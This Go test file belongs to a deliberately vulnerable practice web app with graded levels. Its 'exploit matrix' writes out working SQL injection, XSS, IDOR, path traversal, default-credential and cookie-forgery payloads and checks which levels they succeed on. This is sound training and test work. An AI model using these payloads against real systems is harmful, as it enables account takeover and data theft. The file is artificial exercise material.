package main

import (
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

var testFlags = map[string]string{"sqli": "FLAG{sqli-t}", "idor": "FLAG{idor-t}",
	"traversal": "FLAG{traversal-t}", "admin": "FLAG{admin-t}"}

type client struct {
	t   *testing.T
	srv *httptest.Server
	c   *http.Client
}

func newClient(t *testing.T, level string) *client {
	flags := map[string]string{}
	for k, v := range testFlags {
		flags[k] = v
	}
	app, err := NewApp(level, "Test", flags, t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(app.Handler())
	t.Cleanup(srv.Close)
	jar, _ := cookiejar.New(nil)
	return &client{t, srv, &http.Client{Jar: jar}}
}

func (c *client) get(path string) (int, string) {
	r, err := c.c.Get(c.srv.URL + path)
	if err != nil {
		c.t.Fatal(err)
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(r.Body)
	return r.StatusCode, string(b)
}

func (c *client) login(u, p string) (int, string) {
	r, err := c.c.PostForm(c.srv.URL+"/login", url.Values{"username": {u}, "password": {p}})
	if err != nil {
		c.t.Fatal(err)
	}
	defer r.Body.Close()
	b, _ := io.ReadAll(r.Body)
	return r.StatusCode, string(b)
}

func (c *client) adminFlag() bool {
	_, body := c.get("/admin")
	return strings.Contains(body, testFlags["admin"])
}

// exploit -> levels where it must succeed; it must fail on every other level.
var matrix = []struct {
	name  string
	works []string
	try   func(c *client) bool
}{
	{"sqli login classic", []string{"easy"}, func(c *client) bool {
		c.login("x' OR '1'='1' -- ", "x")
		return c.adminFlag()
	}},
	{"sqli login hash comment", []string{"easy", "medium"}, func(c *client) bool {
		c.login("admin'#", "x")
		return c.adminFlag()
	}},
	{"sqli login inline comments", []string{"easy", "medium", "hard"}, func(c *client) bool {
		c.login("x'/**/OR/**/'a'='a", "x'/**/OR/**/'a'='a")
		return c.adminFlag()
	}},
	{"sqli union (spaces)", []string{"easy", "medium"}, func(c *client) bool {
		_, b := c.get("/directory?q=" + url.QueryEscape("zz' UNION SELECT name, value FROM secrets WHERE name LIKE '"))
		return strings.Contains(b, testFlags["sqli"])
	}},
	{"sqli union (inline comments)", []string{"easy", "medium", "hard"}, func(c *client) bool {
		_, b := c.get("/directory?q=" + url.QueryEscape("zz'/**/UNION/**/SELECT/**/name,value/**/FROM/**/secrets/**/WHERE/**/name/**/LIKE/**/'"))
		return strings.Contains(b, testFlags["sqli"])
	}},
	{"xss script tag", []string{"easy"}, func(c *client) bool {
		_, b := c.get("/directory?q=" + url.QueryEscape("<script>alert(1)</script>"))
		return strings.Contains(b, "<script>alert(1)</script>")
	}},
	{"xss img onerror", []string{"easy", "medium"}, func(c *client) bool {
		_, b := c.get("/directory?q=" + url.QueryEscape("<img src=x onerror=alert(1)>"))
		return strings.Contains(b, "<img src=x onerror=alert(1)>")
	}},
	{"xss attribute breakout", []string{"easy", "hard"}, func(c *client) bool {
		_, b := c.get("/directory?q=" + url.QueryEscape(`" autofocus onfocus=alert(1) x="`))
		return strings.Contains(b, `value="" autofocus onfocus=alert(1) x=""`)
	}},
	{"idor anonymous", []string{"easy"}, func(c *client) bool {
		_, b := c.get("/notes?id=1")
		return strings.Contains(b, testFlags["idor"])
	}},
	{"idor as j.doe (id)", []string{"easy", "medium"}, func(c *client) bool {
		c.login("j.doe", "summer2024")
		_, b := c.get("/notes?id=1")
		return strings.Contains(b, testFlags["idor"])
	}},
	{"idor as j.doe (base64 ref)", []string{"hard"}, func(c *client) bool {
		c.login("j.doe", "summer2024")
		_, b := c.get("/notes?ref=" + noteRef(1))
		return strings.Contains(b, testFlags["idor"])
	}},
	{"traversal plain", []string{"easy"}, func(c *client) bool {
		_, b := c.get("/files?name=" + url.QueryEscape("../private/flag.txt"))
		return strings.Contains(b, testFlags["traversal"])
	}},
	{"traversal ....//", []string{"medium"}, func(c *client) bool {
		_, b := c.get("/files?name=" + url.QueryEscape("....//private/flag.txt"))
		return strings.Contains(b, testFlags["traversal"])
	}},
	{"traversal double encoding", []string{"hard"}, func(c *client) bool {
		_, b := c.get("/files?name=%252e%252e%252fprivate%252fflag.txt")
		return strings.Contains(b, testFlags["traversal"])
	}},
	{"default creds admin:admin", []string{"easy"}, func(c *client) bool {
		c.login("admin", "admin")
		return c.adminFlag()
	}},
	{"leaked creds from backup", []string{"easy", "medium"}, func(c *client) bool {
		_, b := c.get("/backup/config.bak")
		i := strings.Index(b, "password=")
		if i < 0 {
			return false
		}
		c.login("admin", strings.TrimSpace(b[i+len("password="):]))
		return c.adminFlag()
	}},
	{"forged role cookie", []string{"easy"}, func(c *client) bool {
		u, _ := url.Parse(c.srv.URL)
		c.c.Jar.SetCookies(u, []*http.Cookie{{Name: "role", Value: "admin", Path: "/"}})
		return c.adminFlag()
	}},
}

func TestExploitMatrix(t *testing.T) {
	for _, m := range matrix {
		for _, level := range Levels {
			want := false
			for _, l := range m.works {
				want = want || l == level
			}
			c := newClient(t, level)
			if got := m.try(c); got != want {
				t.Errorf("%-28s level=%-6s exploited=%v want %v", m.name, level, got, want)
			}
		}
	}
}

func TestEveryNonSecureLevelHasAllFlagsReachable(t *testing.T) {
	for _, level := range []string{"easy", "medium", "hard"} {
		got := map[string]bool{}
		for _, m := range matrix {
			for _, l := range m.works {
				if l == level {
					got[m.name] = true
				}
			}
		}
		need := map[string][]string{
			"sqli":      {"sqli union (spaces)", "sqli union (inline comments)"},
			"idor":      {"idor anonymous", "idor as j.doe (id)", "idor as j.doe (base64 ref)"},
			"traversal": {"traversal plain", "traversal ....//", "traversal double encoding"},
			"admin":     {"sqli login classic", "sqli login hash comment", "sqli login inline comments"},
		}
		for flag, ways := range need {
			ok := false
			for _, w := range ways {
				ok = ok || got[w]
			}
			if !ok {
				t.Errorf("level %s: flag %s unreachable", level, flag)
			}
		}
	}
}

func TestSecureLevelBehaviour(t *testing.T) {
	c := newClient(t, "secure")
	if code, _ := c.login("j.doe", "summer2024"); code != http.StatusFound && code != http.StatusOK {
		t.Fatalf("legit login failed: %d", code)
	}
	if _, b := c.get("/notes?id=2"); !strings.Contains(b, "Renew VPN") {
		t.Error("owner cannot read own note")
	}
	if _, b := c.get("/files?name=handbook.txt"); !strings.Contains(b, "handbook") {
		t.Error("legit file download broken")
	}
	r, _ := c.c.Get(c.srv.URL + "/")
	if r.Header.Get("Content-Security-Policy") == "" || r.Header.Get("Server") != "" {
		t.Error("secure headers missing")
	}
	if code, _ := c.get("/backup/config.bak"); code != http.StatusNotFound {
		t.Error("backup exposed on secure")
	}
}

func TestEasyLeaksSQLErrors(t *testing.T) {
	c := newClient(t, "easy")
	_, b := c.get("/directory?q='")
	if !strings.Contains(b, "SQL error") || !strings.Contains(b, "query:") {
		t.Error("easy level should leak SQL errors")
	}
	m := newClient(t, "medium")
	if _, b := m.get("/directory?q='"); strings.Contains(b, "SQL error") {
		t.Error("medium must not leak SQL errors")
	}
}

func TestLoggedHandlerEmitsAccessLine(t *testing.T) {
	app, err := NewApp("easy", "T", map[string]string{}, t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}
	var buf strings.Builder
	srv := httptest.NewServer(app.LoggedHandler(&buf))
	defer srv.Close()
	http.Get(srv.URL + "/directory?q=zz%27%20UNION%20SELECT")
	line := strings.TrimSpace(buf.String())
	if !strings.HasPrefix(line, "{") || !strings.Contains(line, `"ev":"http"`) ||
		!strings.Contains(line, `"path":"/directory"`) || !strings.Contains(line, "UNION") {
		t.Errorf("bad access line: %q", line)
	}
}
